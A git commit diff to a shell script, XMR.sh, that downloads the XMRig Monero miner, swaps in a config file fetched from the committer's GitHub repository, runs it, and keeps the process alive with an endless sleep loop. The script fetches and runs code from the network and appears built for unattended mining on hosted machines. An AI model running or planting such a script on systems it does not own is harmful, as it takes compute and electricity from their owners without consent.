8627236cc12faf2cf8d3f64a7c6b94e6a1fffb27
ceeb57f83688 <84587193+ceeb57f83688@users.noreply.github.com>
2021-06-15 18:00:36 +0100

    Update XMR.sh

--- XMR.sh
+++ XMR.sh
@@ -1,5 +1,7 @@
 #!/bin/sh
-wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz && tar xf xmrig-6.12.2-linux-x64.tar.gz && cd xmrig-6.12.2 && ./xmrig --max-cpu-usage 50 --cpu-priority 0 -o pool.minexmr.com:4444 -u 48Tf2rj4iM7TMT71sgSKZ2LwrVRuehUH9eRRNyi9uk9mYeD7bmcGk3iKLfomoBK5jHb56YmdHCZcq2PtZNfHepw21ZX51YF
+wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz && tar xf xmrig-6.12.2-linux-x64.tar.gz && cd xmrig-6.12.2 && rm -rf config.json && ls
+wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/config.json && ls
+./xmrig
 while [ 1 ]; do
 sleep 3
 done
